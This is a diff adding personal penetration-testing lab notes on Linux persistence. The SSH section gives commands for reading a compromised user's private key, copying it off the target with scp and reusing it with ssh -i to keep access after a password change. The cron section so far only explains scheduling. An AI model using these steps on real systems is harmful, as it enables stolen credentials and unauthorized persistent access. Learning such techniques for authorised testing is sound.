@@ -52,16 +52,35 @@ login on screen with new credentials and open cmd (run as administrator): ``whoa
 
 ##### Persistence via SSH keys
 
+- Linux is deployed as a server operating system (to host applications) and as a result linux servers typically accessed remotely via services/protocol's such as ssh. 
+- if ssh is enabled and running on a linux system you have compromised, you can take advantage of the ssh configuration to establish persistent access on the target system. 
+- in most cases linux servers will have key-based authentication enabled for the ssh service, allowing users to access the linux system remotely without the need for password 
+- After gaining access to a linux system, we can transfer the ssh private key of a specific user account to our system and use that ssh private key for all future authentication and access. 
 
 
 
 
+ssh student@target_ip 
+password: password 
 
+- login into compromised account with ssh:  student@target_ip 
+- ls -al 
 
+we have two interesting folders: .ssh folder and a binary folder called wait. 
+- cat wait  (when you are done delete the wait binary)
+- cd .ssh/  (here we will find the private key, (generated with sshgn)), cat the content of the private key
+- cat the other content in the ssh file 
+- copy id_rsa onto our system with ``scp`` which will allow us to download a file from the target system to our kali system, via ssh: ``scp student@target_ip:~/file_you_want_to_download ``
+			 - ``~/.ssh/id_rsa .``  (the ``.`` means you want to copy it to the directory you currently in)
 
+- give the id_rsa file the permissions that typically associated with private keys : ``chmod 400 id_rsa ``
 
+Log back into the system with ssh and compromised account
+- when you are SUPER SURE that you downloaded the rsa key you remove the wait file: ``rm wait `` which will reset the connection. 
 
-
+Even when the user changes the password, we can still login using the **rsa private key.** 
+- ``ssh  -i name_privatekey_file user@target_ip ``
+``   ssh -i id_rsa student@targetip``
 
 
 
@@ -73,3 +92,8 @@ login on screen with new credentials and open cmd (run as administrator): ``whoa
 
 ##### persistence via Cron Jobs 
 
+- Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule
+- An application or script that has been configured to be run repeatedly with Cron is known as a Cron job. 
+- We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system. 
+- anatomy of a cron job: ![[Pasted image 20230925152000.png]]
+first 5 fields are used to specify the time and date 
